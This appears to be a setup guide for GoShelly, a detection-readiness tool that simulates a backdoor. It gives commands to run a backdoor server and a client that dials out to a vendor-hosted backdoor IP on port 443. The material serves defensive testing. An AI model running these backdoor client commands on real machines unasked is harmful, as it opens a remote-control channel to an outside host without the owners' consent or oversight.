Guide for Araali GoShelly
=========================

Araali GoShelly is an open source tool that helps security teams safely test their detect and response readiness (the fire drill for SIEM/SOAR/EDR/NDR/XDR investment) 
for backdoors. This is typical when supply chain vulnerabilities like remote code execution (RCE) are exploited and represents a doomsday scenario where an attacker
has full remote control capabilities based on the backdoor.


Installation
------------

Similar to the deprecated version of this tool, Araali Shelly, GoShelly offers the option to run your own 
backdoor and/or use the already running backdoor offered by Araali to listen for incoming connections.

Setup a backdoor servivce
_________________________

To use your own backdoor server
+++++++++++++++++++++++++++++++
On a machine, independent from the machine you wish to test the attack response readiness for, install and configure GoShelly server
using the following instructions

    Clone the repository from GitHub
        SSH::
        git clone git@github.com:arorasoham9/goshelly-server.git .

        HTTPS::
        git clone https://github.com/arorasoham9/goshelly-server.git .
                
    Make the binary executable::
        chmod +x goshelly-Serv

    Run the below command to make the GoShelly Server start listening::
        ./goshelly-Serv -a

To use Araali's backdoor server
++++++++++++++++++++++++++++++++
Nothing. It's already running.Follow the instructions below to dial to our backdoor server using GoShelly Client.


Setup GoShelly Client
_____________________
On the VM or K8S cluster, you wish to test the attack response readiness for, install and configure GoShelly Client 
using the following instructions
    
    **For Virtual Machines(VMs)**
        Clone the repository from GitHub
            SSH::
                git clone git@github.com:arorasoham9/goShellyClient.git .
            HTTPS::
                git clone https://github.com/arorasoham9/goShellyClient.git .

        Make the binary executable::
            chmod +x goshelly

        Run the below command to make the GoShelly Client dial out to the backdoor server
            If using Araali's backdoor servivce::
                ./goshelly 194.195.115.136:443
            If using your own backdoor servivce::
                ./goshelly <ip-address>:443
            

    **For K8S Cluster**
    Instructions not available just yet. Awaiting helm deployment. -Soham



Installation
------------
To view results, check your Araali console.


